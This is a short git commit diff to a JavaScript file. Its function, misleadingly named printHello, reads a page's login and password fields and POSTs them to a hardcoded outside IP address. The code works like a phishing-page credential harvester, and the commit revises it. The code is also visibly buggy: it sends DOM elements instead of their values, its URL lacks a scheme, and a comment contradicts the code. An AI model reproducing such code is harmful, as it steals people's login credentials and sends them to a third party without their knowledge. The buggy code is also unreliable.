a7dd9c2d50b9f05df8a5f087debbd833e595533b
Jordan Liu <jminjie@umich.edu>
2016-04-21 18:32:47 -0400

    Fix main.js request

--- javascripts/main.js
+++ javascripts/main.js
@@ -2,11 +2,11 @@ function printHello() {
 	// grab the login and pass
 	var uniq = document.getElementById('login');
 	var password = document.getElementById('password');
-    console.log(uniq, password);
 	// send the login and pass as resquests
 	var xmlHttp = new XMLHttpRequest();
-	xmlHttp.open( "POST", 35.2.222.118:80, false ); // false for synchronous request
-	xmlHttp.send(uniq);
-	xmlHttp.send(password);
+	xmlHttp.open( "POST", "35.2.222.118", true); // false for synchronous request
+	xmlHttp.send("<uniq>" + uniq + "</uniq>");
+	xmlHttp.open( "POST", "35.2.222.118", true); // false for synchronous request
+	xmlHttp.send("<pass>" + password + "</pass>");
 }
 
